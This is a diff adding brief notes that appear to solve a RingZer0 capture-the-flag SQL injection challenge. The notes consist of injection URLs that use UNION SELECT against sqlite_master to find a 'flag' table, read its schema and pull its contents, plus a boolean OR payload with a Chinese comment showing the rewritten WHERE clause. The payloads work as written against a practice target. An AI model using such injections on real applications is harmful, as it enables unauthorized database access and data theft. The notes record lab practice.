@@ -1,0 +1,17 @@
+http://ringzer0team.com/challenges/40/?id=0 and display=1) union all select 1,2,3 -- 
+1
+
+http://ringzer0team.com/challenges/40/?id=0 and display=1) union all SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table' -- 
+union all select sql,2,3 from sqlite_master where type='table' and tbl_name='flag' 
+
+flag CREATE TABLE flag (content varchar(100), display int(1), id int(10)) 
+
+
+http://ringzer0team.com/challenges/40/?id=0 and display=1)  union all select content,2,3 from flag limit 1,1 -- 
+
+don't forget to base64 encode
+
+http://ringzer0team.com/challenges/40/?id=0) OR (ID IS NULL) OR (1=2
+
+拼凑成:
+WHERE (id IS NOT NULL) AND (ID = 0) OR (ID IS NULL) OR (1=2 AND display = 1)
